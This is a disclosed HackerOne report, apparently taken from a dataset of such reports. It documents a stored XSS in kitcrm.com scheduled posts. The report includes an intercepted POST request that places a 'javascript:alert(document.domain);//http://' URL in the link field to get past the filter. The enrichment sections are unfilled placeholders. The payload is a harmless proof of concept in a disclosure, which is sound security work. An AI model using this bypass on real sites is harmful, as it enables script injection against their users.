---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '214581'
original_report_id: '214581'
title: Stored passive XSS at scheduled posts (kitcrm.com)
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: shopify
created_at: '2017-03-19T00:26:18.178Z'
disclosed_at: '2017-03-28T20:57:36.389Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Stored passive XSS at scheduled posts (kitcrm.com)

## Metadata

- HackerOne Report ID: 214581
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: shopify
- Disclosed At: 2017-03-28T20:57:36.389Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello!

There is improper filtration of the `website link` field of scheduled post. Attacker can intercept the scheduled post creation/modifying request and change it content the following way:

```http
POST /pages/175422/manual_posts/31163 HTTP/1.1
Host: kitcrm.com
<redacted>

-----------------------------15916813141840537191014403553
Content-Disposition: form-data; name="manual_post[link]"

javascript:alert(document.domain);//http://
-----------------------------15916813141840537191014403553
<redacted>
```

that leads to filter bypass and JS execution while victim clicks the link:

{F169880}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
